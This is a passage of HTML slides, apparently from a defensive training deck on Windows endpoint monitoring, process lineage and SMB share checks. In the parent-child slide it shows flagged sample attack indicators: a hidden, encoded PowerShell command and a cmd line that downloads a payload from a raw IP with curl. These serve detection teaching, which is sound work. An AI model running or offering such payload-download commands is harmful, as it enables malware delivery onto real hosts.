+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> MONITORING</div>
+        <h2>Endpoint Security Monitoring</h2>
+        <p>Effective monitoring comes down to watching a handful of signal categories closely, since almost everything an attacker does on an endpoint shows up in one of them.</p>
+
+        <div class="card-row card-row--2" style="margin-top: 1.1em;">
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+            <h4>Process Execution</h4>
+            <p>Monitoring running processes — executable files, PIDs, command-line arguments, and the parent-child process hierarchy.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
+            <h4>File System Changes</h4>
+            <p>Tracking creation, modification, and deletion of files through File Integrity Monitoring (FIM).</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--green"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg></div>
+            <h4>Network Connections</h4>
+            <p>Traffic and connections initiated from the endpoint, along with the processes and executables behind them.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--amber"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg></div>
+            <h4>Registry Modifications</h4>
+            <p>Monitoring changes to registry keys and values — a common spot for persistence and configuration tampering.</p>
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 1.2em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>Coming up:</strong> we'll use these four categories as the foundation for extracting insights from system internals and configuring a working detection solution.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 7 — Analyzing Network Connections
+         ========================================== -->
+    <div class="slide" data-slide="6" data-title="Analyzing Network Connections"
+         data-notes="Purpose first: malware has to communicate to be useful, so connections are high-value evidence. Cover netstat -anob flag by flag, then TCPView as the GUI equivalent. Walk through the sample capture and point out what makes the last connection suspicious — unfamiliar IP, uncommon port, and a process (powershell.exe) with no normal reason to be calling out.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> SYSTEM INTERNALS</div>
+        <h2>Analyzing Network Connections</h2>
+        <p>Malware has to talk to succeed — command-and-control callbacks, payload downloads, lateral movement, and data exfiltration all show up as connections on the host. Reading those connections, and tying each one back to the process that opened it, is one of the fastest ways to catch an endpoint that's already been compromised.</p>
+
+        <div class="two-col" style="margin-top: 1.1em;">
+          <div class="col-block col-block--blue">
+            <h4>netstat -anob <span class="tag tag--blue" style="margin-left: 6px;">CLI</span></h4>
+            <p style="font-size: 0.86rem; margin-bottom: 0.7em;">Built into Windows — no install needed, scriptable, and the fastest way to check connections during triage.</p>
+            <div class="field-defs" style="margin-top: 0.2em;">
+              <div class="field-def"><span class="fd-term">-a</span>All connections &amp; listening ports</div>
+              <div class="field-def"><span class="fd-term">-n</span>Numeric addresses — skips slow DNS lookups</div>
+              <div class="field-def"><span class="fd-term">-o</span>Owning process ID (PID) per connection</div>
+              <div class="field-def"><span class="fd-term">-b</span>Executable behind the connection (admin)</div>
+            </div>
+          </div>
+          <div class="col-block col-block--purple">
+            <h4>TCPView <span class="tag tag--purple" style="margin-left: 6px;">GUI · Sysinternals</span></h4>
+            <ul>
+              <li>Same data as <span class="mono">netstat</span>, refreshed live and color-flashed as connections open and close</li>
+              <li>Sortable by process, PID, or state — much faster to scan than raw text output</li>
+              <li>Right-click a connection to close it or jump straight to its process</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="terminal" style="margin-top: 1.15em;">
+          <div class="terminal-bar">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--amber"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+            <span class="terminal-label">cmd.exe — netstat -anob</span>
+          </div>
+          <div class="terminal-body">
+            <div class="t-line"><span class="t-prompt">C:\&gt;</span> <span class="t-cmd">netstat -anob</span></div>
+            <div class="t-line t-comment">Proto  Local Address         Foreign Address        State         PID</div>
+            <div class="t-line">TCP    0.0.0.0:135           0.0.0.0:0              LISTENING     1220</div>
+            <div class="t-line t-comment">       [wininit.exe]</div>
+            <div class="t-line">TCP    192.168.1.15:52142    142.250.72.14:443      ESTABLISHED   4832</div>
+            <div class="t-line t-comment">       [chrome.exe]</div>
+            <div class="t-line" style="color: var(--accent-red);">TCP    192.168.1.15:52210    185.220.101.7:4444     ESTABLISHED   6120</div>
+            <div class="t-line t-comment" style="color: var(--accent-red);">       [powershell.exe]  ← unfamiliar IP, uncommon port, unexpected caller</div>
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 1.15em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>The purpose:</strong> baseline what's normal for a host, then hunt for what isn't — unexpected <span class="mono">LISTENING</span> ports, <span class="mono">ESTABLISHED</span> connections to unfamiliar IPs or high/uncommon ports, and processes with no legitimate reason to be making outbound calls at all.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 8 — Checking Shared Resources
+         ========================================== -->
+    <div class="slide" data-slide="7" data-title="Checking Shared Resources"
+         data-notes="Bridge from network connections into shared resources — attackers enumerate and abuse SMB shares for lateral movement, staging tools, and exfiltration. Walk through net share (what's exposed), net view (what's visible from this host), and net session (who's connected in). Point out that an unexpected admin share, an unfamiliar remote session, or shares no one on the team recognizes are all red flags worth chasing.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> SYSTEM INTERNALS</div>
+        <h2>Checking Shared Resources</h2>
+        <p>Network connections aren't the only way attackers move through a host — <strong class="red">shared folders and admin shares (SMB)</strong> are a favorite path for lateral movement, dropping tools, and pulling data out. Checking what's shared, what's visible, and who's connected in is a quick way to catch that kind of exploitation early.</p>
+
+        <div class="card-row card-row--3" style="margin-top: 1.1em;">
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="7" width="18" height="13" rx="2"/><path d="M3 7l3-4h12l3 4"/><path d="M12 12v4"/></svg></div>
+            <h4>net share <span class="tag tag--blue" style="margin-left: 4px;">CLI</span></h4>
+            <p>Lists every folder shared out from <strong>this</strong> host — including hidden admin shares like <span class="mono">C$</span> and <span class="mono">ADMIN$</span>. Shows what an attacker could reach if they landed here.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/></svg></div>
+            <h4>net view <span class="tag tag--purple" style="margin-left: 4px;">CLI</span></h4>
+            <p>Shows shares visible on a remote machine — <span class="mono">net view \\host</span> — the same recon step an attacker runs to find what's worth pivoting to next.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="7" r="3"/><path d="M2 21v-2a5 5 0 0 1 5-5h4a5 5 0 0 1 5 5v2"/><path d="M17 10l3 3-3 3"/></svg></div>
+            <h4>net session <span class="tag tag--blue" style="margin-left: 4px;">CLI</span></h4>
+            <p>Lists active inbound sessions to this host — who's currently connected and to which share. An unfamiliar remote user here means someone is already in.</p>
+          </div>
+        </div>
+
+        <div class="terminal" style="margin-top: 1.15em;">
+          <div class="terminal-bar">
+            <span class="terminal-dot terminal-dot--red"></span>
+            <span class="terminal-dot terminal-dot--amber"></span>
+            <span class="terminal-dot terminal-dot--green"></span>
+            <span class="terminal-label">cmd.exe — net share / net session</span>
+          </div>
+          <div class="terminal-body">
+            <div class="t-line"><span class="t-prompt">C:\&gt;</span> <span class="t-cmd">net share</span></div>
+            <div class="t-line t-comment">Share name   Resource                        Remark</div>
+            <div class="t-line">C$           C:\                             Default share</div>
+            <div class="t-line">ADMIN$       C:\Windows                      Remote Admin</div>
+            <div class="t-line" style="color: var(--accent-red);">FINANCE      C:\Shares\Finance               ← not on the baseline share list</div>
+            <div class="t-line"><span class="t-prompt">C:\&gt;</span> <span class="t-cmd">net session</span></div>
+            <div class="t-line t-comment">Computer          User name         Client Type   Idle time</div>
+            <div class="t-line" style="color: var(--accent-red);">\\192.168.1.44    svc_backup        Windows 10    00:02:11  ← unrecognized remote user</div>
+          </div>
+        </div>
+
+        <div class="warn-box" style="margin-top: 1.15em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg></div>
+          <p><strong>Why it matters:</strong> attackers routinely scan for open or misconfigured SMB shares to stage payloads, exfiltrate files, or move laterally between hosts — often the exact abuse behind the <strong class="red">EternalBlue / SMB port-445</strong> exploitation family. An unexpected share, an unrecognized session, or admin shares reachable without proper restrictions are all worth investigating immediately.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 9 — Process Analysis Tools
+         ========================================== -->
+    <div class="slide" data-slide="8" data-title="Analyzing Running Processes"
+         data-notes="Introduce the four tools before touching the deeper concepts. Emphasize the gap between the CLI tools (fast, scriptable, full command-line visibility with wmic) and the GUI tools (easier to scan, but Task Manager alone won't show you a command line or a deep tree — that's what Process Explorer is for).">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> SYSTEM INTERNALS</div>
+        <h2>Analyzing Running Processes</h2>
+        <p>Almost everything an attacker does eventually runs as a process. Reading the process list closely — not just what's running, but <strong class="blue">what launched it</strong> and <strong class="purple">what arguments it was given</strong> — turns a wall of executable names into a story of what actually happened on the host.</p>
+
+        <div class="card-row card-row--4" style="margin-top: 1.1em;">
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3"/><line x1="13" y1="15" x2="17" y2="15"/></svg></div>
+            <h4>tasklist</h4>
+            <p>Built-in CLI — lists running processes with PID, memory, and session; add <span class="mono">/v</span> for the owning window title.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3"/><line x1="13" y1="15" x2="17" y2="15"/></svg></div>
+            <h4>wmic process</h4>
+            <p>Built-in CLI — queries process objects directly, including the full <span class="mono">CommandLine</span> and <span class="mono">ParentProcessId</span>.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="3" width="16" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+            <h4>Task Manager</h4>
+            <p>Built-in GUI — quick and familiar, but limited: no command line shown, and the process tree view is shallow.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="2"/><circle cx="6" cy="19" r="2"/><circle cx="18" cy="19" r="2"/><path d="M12 7v4M12 11l-5 6M12 11l5 6"/></svg></div>
+            <h4>Process Explorer</h4>
+            <p>Sysinternals GUI — full process tree, command line, loaded DLLs, and digital signature checks in one view.</p>
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 1.2em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>Before hunting for anomalies:</strong> you need to know what's normal. That starts with recognizing the three broad categories every process on a Windows host falls into.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 10 — Types of Processes
+         ========================================== -->
+    <div class="slide" data-slide="9" data-title="Types of Processes"
+         data-notes="Establish the three categories before naming specific processes. This is the mental model students need before the System/smss/csrss/etc. deep-dives: is this a core OS process, something the logged-in user launched, or a background service? Most anomaly-spotting starts by asking which bucket a process should be in, and whether it's behaving like it.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> PROCESS FUNDAMENTALS</div>
+        <h2>Types of Processes</h2>
+        <p>Before judging whether a process looks right, you need to know what category it belongs to. On Windows, almost every process falls into one of three buckets.</p>
+
+        <div class="card-row card-row--3" style="margin-top: 1.15em;">
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M4 9h16"/><circle cx="7" cy="6.5" r="0.6" fill="#6b93f7"/><circle cx="9" cy="6.5" r="0.6" fill="#6b93f7"/></svg></div>
+            <h4>System (Windows) Processes</h4>
+            <p>Core OS processes that start at boot and typically run with SYSTEM or kernel-level privileges — <span class="mono">System</span>, <span class="mono">smss.exe</span>, <span class="mono">csrss.exe</span>, <span class="mono">wininit.exe</span>, <span class="mono">lsass.exe</span>. Essential to the OS; should never be missing, duplicated oddly, or running from the wrong path.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4.4 3.6-7 8-7s8 2.6 8 7"/></svg></div>
+            <h4>User (App) Processes</h4>
+            <p>Applications the logged-in user launches directly — browsers, Office, custom software. Run under the user's own account and privileges, and are tied to their interactive session.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--green"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></div>
+            <h4>Service (Background) Processes</h4>
+            <p>Run continuously in the background, independent of any logged-in user — usually launched by <span class="mono">services.exe</span>. Includes <span class="mono">svchost.exe</span> instances hosting Windows services, antivirus agents, and update daemons.</p>
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 1.2em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>Next:</strong> we'll walk through the critical Windows system processes one at a time — what each one is supposed to look like, so you can immediately spot one that doesn't.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 11 — Parent-Child Process Relationships
+         ========================================== -->
+    <div class="slide" data-slide="10" data-title="Parent-Child Process Relationships"
+         data-notes="Walk the tree top to bottom — WINWORD.EXE spawning POWERSHELL.EXE is the anomaly, and the encoded command line plus the further spawned CMD.EXE reaching out to a raw IP reinforces it. Close on what to check for any process you're investigating: parent, command line, and execution path.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> SYSTEM INTERNALS</div>
+        <h2>Parent-Child Process Relationships</h2>
+        <p>Every process is the child of the one that launched it. Legitimate software follows predictable lineages — when a process breaks that pattern, the mismatch is often the clearest signal available.</p>
+
+        <div class="proc-tree">
+          <div class="proc-node">
+            <div class="proc-icon" style="background: rgba(53,99,233,0.14); border: 1px solid rgba(53,99,233,0.2);"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
+            <div>
+              <span class="proc-name">WINWORD.EXE<span class="proc-meta">PID 3344</span></span>
+              <div class="proc-cmdline">"C:\Program Files\Microsoft Office\WINWORD.EXE" /n "invoice_report.docm"</div>
+            </div>
+          </div>
+          <div class="proc-children">
+            <div class="proc-node flagged">
+              <div class="proc-icon" style="background: rgba(248,113,113,0.14); border: 1px solid rgba(248,113,113,0.25);"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+              <div>
+                <span class="proc-name" style="color: #fca5a5;">POWERSHELL.EXE<span class="proc-meta">PID 5820 · parent 3344</span></span>
+                <div class="proc-cmdline">-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA...</div>
+              </div>
+              <span class="tag tag--red proc-tag">ANOMALY</span>
+            </div>
+            <div class="proc-children">
+              <div class="proc-node flagged">
+                <div class="proc-icon" style="background: rgba(248,113,113,0.14); border: 1px solid rgba(248,113,113,0.25);"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg></div>
+                <div>
+                  <span class="proc-name" style="color: #fca5a5;">CMD.EXE<span class="proc-meta">PID 6104 · parent 5820</span></span>
+                  <div class="proc-cmdline">/c curl.exe -o update.exe http://185.220.101.7/payload</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="warn-box" style="margin-top: 1.1em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div>
+          <p><strong>Classic red flag:</strong> an Office application spawning a shell like <span class="mono">powershell.exe</span> or <span class="mono">cmd.exe</span> is one of the most reliable indicators of a malicious macro executing — legitimate documents almost never need to launch a shell.</p>
+        </div>
+
+        <div class="info-box" style="margin-top: 0.9em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>For every process, check three things:</strong> the parent-child lineage (does this chain make sense?), the full command line (encoded, obfuscated, or unusual arguments), and the execution path — a "svchost.exe" running from a Temp folder is not the real svchost.exe.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 12 — The Windows Process Tree
+         ========================================== -->
+    <div class="slide" data-slide="11" data-title="The Windows Process Tree"
+         data-notes="This is the map before the individual deep-dives. Walk it top-down: System spawns the one and only smss.exe master instance, which forks into a per-session smss.exe — Session 0 for OS/services, Session 1+ for the interactive logon. Session 0's branch builds the service environment (services.exe, lsass.exe, svchost.exe); Session 1's branch builds the user's desktop (winlogon.exe → userinit.exe → explorer.exe). Point out that userinit.exe is transient — it exits after launching explorer.exe, which is why a live userinit.exe still running is itself worth a second look.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> WINDOWS PROCESSES</div>
+        <h2>The Windows Process Tree</h2>
+        <p>Every legitimate process on a Windows host traces back to this same skeleton. Knowing the shape of the healthy tree is what makes a broken branch — a wrong parent, a missing link, an extra hop — jump out immediately.</p>
+
+        <div class="proc-tree-diagram" style="margin-top: 1em;">
+          <svg viewBox="0 0 1150 600" xmlns="http://www.w3.org/2000/svg" style="width:100%; height:auto; display:block;">
+            <defs>
+              <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path d="M0,0 L10,5 L0,10 z" fill="rgba(160,178,196,0.55)"/>
+              </marker>
+            </defs>
+
+            <!-- connectors -->
+            <g stroke="rgba(160,178,196,0.45)" stroke-width="1.5" fill="none">
+              <!-- System -> Master -->
+              <line x1="580" y1="77.5" x2="580" y2="122.5" marker-end="url(#arrow)"/>
+              <!-- Master -> Session0 / Session1 -->
+              <polyline points="580,177.5 580,200 290,200 290,222.5" marker-end="url(#arrow)"/>
+              <polyline points="580,200 870,200 870,222.5" marker-end="url(#arrow)"/>
+              <!-- Session0 -> csrss / wininit -->
+              <polyline points="290,277.5 290,300 150,300 150,322.5" marker-end="url(#arrow)"/>
+              <polyline points="290,300 430,300 430,322.5" marker-end="url(#arrow)"/>
+              <!-- Session1 -> winlogon / csrss -->
+              <polyline points="870,277.5 870,300 740,300 740,322.5" marker-end="url(#arrow)"/>
+              <polyline points="870,300 1000,300 1000,322.5" marker-end="url(#arrow)"/>
+              <!-- wininit -> services / lsass -->
+              <polyline points="430,377.5 430,400 300,400 300,422.5" marker-end="url(#arrow)"/>
+              <polyline points="430,400 560,400 560,422.5" marker-end="url(#arrow)"/>
+              <!-- winlogon -> userinit -->
+              <line x1="740" y1="377.5" x2="740" y2="422.5" marker-end="url(#arrow)"/>
+              <!-- services -> svchost -->
+              <line x1="300" y1="477.5" x2="300" y2="522.5" marker-end="url(#arrow)"/>
+              <!-- userinit -> explorer -->
+              <line x1="740" y1="477.5" x2="740" y2="522.5" marker-end="url(#arrow)"/>
+            </g>
+
+            <!-- nodes -->
+            <!-- System PID 4 -->
+            <g>
+              <rect x="495" y="22.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="580" y="45" text-anchor="middle" fill="#e8ecf4" font-family="Space Grotesk, sans-serif" font-size="15" font-weight="700">System</text>
+              <text x="580" y="63" text-anchor="middle" fill="#a0aec4" font-family="JetBrains Mono, monospace" font-size="11">PID 4</text>
+            </g>
+
+            <!-- smss.exe Master -->
+            <g>
+              <rect x="495" y="122.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="580" y="145" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">smss.exe</text>
+              <text x="580" y="163" text-anchor="middle" fill="#c5a0fc" font-family="Outfit, sans-serif" font-size="11">(Master)</text>
+            </g>
+
+            <!-- smss.exe Session 0 -->
+            <g>
+              <rect x="205" y="222.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="290" y="245" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">smss.exe</text>
+              <text x="290" y="263" text-anchor="middle" fill="#c5a0fc" font-family="Outfit, sans-serif" font-size="11">(Session 0)</text>
+            </g>
+            <!-- smss.exe Session 1 -->
+            <g>
+              <rect x="785" y="222.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="870" y="245" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">smss.exe</text>
+              <text x="870" y="263" text-anchor="middle" fill="#c5a0fc" font-family="Outfit, sans-serif" font-size="11">(Session 1)</text>
+            </g>
+
+            <!-- csrss.exe (left) -->
+            <g>
+              <rect x="65" y="322.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="150" y="355" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">csrss.exe</text>
+            </g>
+            <!-- wininit.exe -->
+            <g>
+              <rect x="345" y="322.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="430" y="355" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">wininit.exe</text>
+            </g>
+            <!-- winlogon.exe -->
+            <g>
+              <rect x="655" y="322.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="740" y="355" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">winlogon.exe</text>
+            </g>
+            <!-- csrss.exe (right) -->
+            <g>
+              <rect x="915" y="322.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="1000" y="355" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">csrss.exe</text>
+            </g>
+
+            <!-- services.exe -->
+            <g>
+              <rect x="215" y="422.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="300" y="455" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">services.exe</text>
+            </g>
+            <!-- lsass.exe -->
+            <g>
+              <rect x="475" y="422.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="560" y="455" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">lsass.exe</text>
+            </g>
+            <!-- userinit.exe (transient, purple-accented) -->
+            <g>
+              <rect x="655" y="422.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="740" y="455" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">userinit.exe</text>
+            </g>
+
+            <!-- svchost.exe -->
+            <g>
+              <rect x="215" y="522.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="300" y="555" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="600">svchost.exe</text>
+            </g>
+            <!-- explorer.exe (anchor of user desktop, purple-accented) -->
+            <g>
+              <rect x="655" y="522.5" width="170" height="55" rx="8" fill="rgba(16,22,42,0.85)" stroke="rgba(168,123,245,0.55)" stroke-width="2"/>
+              <text x="740" y="555" text-anchor="middle" fill="#e8ecf4" font-family="JetBrains Mono, monospace" font-size="14" font-weight="700">explorer.exe</text>
+            </g>
+          </svg>
+        </div>
+
+        <div class="info-box" style="margin-top: 1em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
